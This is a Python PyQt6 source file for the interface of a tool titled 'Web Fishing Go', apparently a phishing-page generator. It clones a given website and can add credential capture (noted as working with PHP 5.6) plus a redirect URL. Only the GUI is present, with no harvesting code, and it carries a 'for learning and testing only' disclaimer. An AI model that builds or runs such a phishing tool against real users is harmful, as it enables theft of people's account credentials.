from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                             QLineEdit, QPushButton, QProgressBar, QLabel,
                             QFileDialog, QCheckBox, QSizePolicy)
from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtGui import QIcon

class WebCloneGUI(QWidget):
    start_clone_signal = pyqtSignal(str, str, bool, bool, str)  # url, output_path, wait_for_load, capture_credentials, redirect_url
    
    def __init__(self):
        super().__init__()
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("Web Fishing Go - 钓鱼web生成")
        self.setMinimumSize(600, 250)  # 设置最小窗口大小
        self.resize(600, 250)  # 设置初始窗口大小
        
        # 设置应用图标
        self.setWindowIcon(QIcon("logo.png"))
        
        # 创建主布局
        main_layout = QVBoxLayout()
        main_layout.setSpacing(10)  # 设置组件之间的间距
        main_layout.setContentsMargins(10, 10, 10, 10)  # 设置布局边距
        
        # URL输入区域
        url_layout = QHBoxLayout()
        url_label = QLabel("网址:")
        url_label.setFixedWidth(60)  # 固定标签宽度
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("请输入要克隆的网址")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        
        # 输出路径选择区域
        path_layout = QHBoxLayout()
        path_label = QLabel("保存路径:")
        path_label.setFixedWidth(60)  # 固定标签宽度
        self.path_input = QLineEdit()
        self.path_input.setPlaceholderText("选择保存路径")
        self.path_input.setReadOnly(True)
        self.browse_button = QPushButton("浏览")
        self.browse_button.setFixedWidth(60)  # 固定按钮宽度
        self.browse_button.clicked.connect(self.choose_directory)
        path_layout.addWidget(path_label)
        path_layout.addWidget(self.path_input)
        path_layout.addWidget(self.browse_button)
        
        # 选项区域
        options_layout = QVBoxLayout()
        options_layout.setSpacing(5)  # 设置选项之间的间距
        
        # 动态加载选项
        self.wait_load_checkbox = QCheckBox("等待页面完全加载（适用于动态加载的网页）")
        
        # 获取账号密码选项和跳转URL输入框
        credentials_layout = QVBoxLayout()
        self.capture_credentials_checkbox = QCheckBox("获取账号密码，php5.6版本有效，其他版本未经测试")
        self.capture_credentials_checkbox.stateChanged.connect(self.toggle_redirect_input)
        
        # 添加跳转URL输入框
        redirect_layout = QHBoxLayout()
        redirect_label = QLabel("跳转网址:")
        redirect_label.setFixedWidth(60)
        self.redirect_input = QLineEdit()
        self.redirect_input.setPlaceholderText("请输入跳转的网址")
        self.redirect_input.hide()  # 默认隐藏
        redirect_label.hide()  # 默认隐藏
        redirect_layout.addWidget(redirect_label)
        redirect_layout.addWidget(self.redirect_input)
        
        credentials_layout.addWidget(self.capture_credentials_checkbox)
        credentials_layout.addLayout(redirect_layout)
        options_layout.addLayout(credentials_layout)
        
        # 按钮区域
        button_layout = QHBoxLayout()
        button_layout.addStretch()  # 添加弹性空间使按钮居中
        self.start_button = QPushButton("开始克隆")
        self.start_button.setFixedWidth(100)  # 固定按钮宽度
        self.cancel_button = QPushButton("取消")
        self.cancel_button.setFixedWidth(100)  # 固定按钮宽度
        self.cancel_button.setEnabled(False)
        self.start_button.clicked.connect(self.start_clone)
        self.cancel_button.clicked.connect(self.cancel_clone)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.cancel_button)
        button_layout.addStretch()  # 添加弹性空间使按钮居中
        
        # 进度条区域
        progress_layout = QVBoxLayout()
        progress_layout.setSpacing(5)  # 设置进度条和状态标签之间的间距
        
        self.progress = QProgressBar()
        self.progress.setFixedHeight(20)  # 固定进度条高度
        self.progress.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        # 状态标签
        self.status_label = QLabel("状态: 等待输入")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignLeft)
        
        progress_layout.addWidget(self.progress)
        progress_layout.addWidget(self.status_label)
        
        # 添加所有组件到主布局
        main_layout.addLayout(url_layout)
        main_layout.addLayout(path_layout)
        main_layout.addLayout(options_layout)
        main_layout.addLayout(button_layout)
        main_layout.addLayout(progress_layout)
        
        # 添加免责声明到底部
        disclaimer_label = QLabel("仅供学习和测试使用。使用本工具所产生的一切法律责任由使用者自行承担。")
        disclaimer_label.setStyleSheet("color: #6c757d; font-size: 11px;")
        disclaimer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(disclaimer_label)
        
        # 保存对跳转相关控件的引用
        self.redirect_label = redirect_label

        # 设置布局
        self.setLayout(main_layout)
        
        # 设置窗口策略
        self.setSizePolicy(QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Minimum)
    
    def choose_directory(self):
        dir_path = QFileDialog.getExistingDirectory(self, "选择保存目录")
        if dir_path:
            self.path_input.setText(dir_path)
    
    def toggle_redirect_input(self, state):
        """切换跳转URL输入框的显示状态"""
        if state == Qt.CheckState.Checked.value:
            self.redirect_label.show()
            self.redirect_input.show()
        else:
            self.redirect_label.hide()
            self.redirect_input.hide()
    
    def start_clone(self):
        url = self.url_input.text().strip()
        output_path = self.path_input.text().strip()
        wait_for_load = self.wait_load_checkbox.isChecked()
        capture_credentials = self.capture_credentials_checkbox.isChecked()
        redirect_url = self.redirect_input.text().strip() if capture_credentials else ""
        
        if not url:
            self.status_label.setText("状态: 请输入有效的网址")
            return
            
        if not output_path:
            self.status_label.setText("状态: 请选择保存路径")
            return
            
        if capture_credentials and not redirect_url:
            self.status_label.setText("状态: 请输入跳转网址")
            return

        self.start_button.setEnabled(False)
        self.cancel_button.setEnabled(True)
        self.status_label.setText("状态: 正在克隆...")
        self.start_clone_signal.emit(url, output_path, wait_for_load, capture_credentials, redirect_url)
    
    def cancel_clone(self):
        self.status_label.setText("状态: 已取消")
        self.start_button.setEnabled(True)
        self.cancel_button.setEnabled(False)
        self.progress.setValue(0)
    
    def update_progress(self, value):
        self.progress.setValue(value)
    
    def update_status(self, message):
        self.status_label.setText(f"状态: {message}")
    
    def clone_finished(self):
        self.start_button.setEnabled(True)
        self.cancel_button.setEnabled(False)
        self.progress.setValue(100)
        self.status_label.setText("状态: 克隆完成") 